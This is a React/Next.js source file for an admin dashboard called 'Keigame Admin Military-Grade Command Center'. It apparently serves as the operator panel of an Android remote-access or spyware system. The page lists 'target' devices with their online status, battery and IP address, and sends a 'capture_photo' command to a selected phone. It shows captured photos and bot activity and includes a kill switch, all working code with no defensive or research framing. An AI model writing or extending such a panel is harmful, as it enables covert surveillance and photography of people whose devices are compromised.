'use client';

import { useEffect, useMemo, useState } from 'react';
import TargetList from '@/components/TargetList';
import PhotoGallery from '@/components/PhotoGallery';
import ActivityLog from '@/components/ActivityLog';
import { KillSwitch } from '@/components/dashboard/KillSwitch';
import { subscribeToTargets, sendCommand } from '@/services/targetService';
import { Target } from '@/types/target';
import { Device } from '@/types';

export default function DashboardPage() {
  const [targets, setTargets] = useState<Target[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedTargetId, setSelectedTargetId] = useState<string | null>(null);
  const [busyTargetId, setBusyTargetId] = useState<string | null>(null);

  useEffect(() => {
    const unsubscribe = subscribeToTargets((incomingTargets: Target[] = []) => {
      setTargets(incomingTargets);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (!selectedTargetId && targets.length > 0) {
      setSelectedTargetId(targets[0].id);
    }
  }, [targets, selectedTargetId]);

  const selectedTarget = useMemo(
    () => targets.find((target) => target.id === selectedTargetId) ?? targets[0] ?? null,
    [selectedTargetId, targets]
  );

  const handleCapture = async (deviceId: string) => {
    setBusyTargetId(deviceId);
    try {
      await sendCommand(deviceId, 'capture_photo');
    } finally {
      setBusyTargetId(null);
    }
  };

  const onlineCount = useMemo(
    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
    [targets]
  );

  const offlineCount = useMemo(() => targets.length - onlineCount, [targets.length, onlineCount]);

  // Convert Target to Device type for KillSwitch
  const devicesForKillSwitch = useMemo(() => {
    return targets.map(t => ({
      id: t.id,
      model: t.deviceInfo?.model || 'Unknown',
      status: (t.status?.toLowerCase() || 'offline') as any,
      battery: t.battery || 0,
      android_version: t.deviceInfo?.os || 'N/A',
      ip_address: t.ip || '0.0.0.0',
      last_ping: t.last_ping || 0
    })) as Device[];
  }, [targets]);

  return (
    <main className="min-h-screen bg-slate-950 px-4 py-6 text-white">
      <div className="mx-auto max-w-[1480px] space-y-6">
        <section className="rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
          <div className="flex flex-col md:flex-row justify-between items-start gap-6">
            <div>
              <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/80">Keigame Admin</p>
              <h1 className="mt-3 text-4xl font-semibold text-white">Military-Grade Command Center</h1>
              <p className="mt-3 max-w-2xl text-sm text-slate-400">
                Monitor perangkat target Android secara real-time, lihat status dan foto terkini, serta pantau aktivitas bot di satu dashboard.
              </p>
            </div>
            <div className="w-full md:w-auto">
              <KillSwitch devices={devicesForKillSwitch} />
            </div>
          </div>

          <div className="mt-8 grid gap-4 sm:grid-cols-3">
            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
              <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Online</p>
              <p className="mt-3 text-3xl font-semibold text-emerald-400">{onlineCount}</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
              <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Offline</p>
              <p className="mt-3 text-3xl font-semibold text-slate-300">{offlineCount}</p>
            </div>
          </div>
        </section>

        <div className="grid gap-6 xl:grid-cols-[2.4fr_1.4fr_1fr]">
          <TargetList
            targets={targets}
            loading={loading}
            selectedTargetId={selectedTargetId ?? undefined}
            onSelect={(deviceId) => setSelectedTargetId(deviceId)}
            onCapture={handleCapture}
            busyTargetId={busyTargetId}
          />

          <PhotoGallery targetId={selectedTarget?.id} />

          <ActivityLog targetId={selectedTarget?.id} />
        </div>
      </div>
    </main>
  );
}
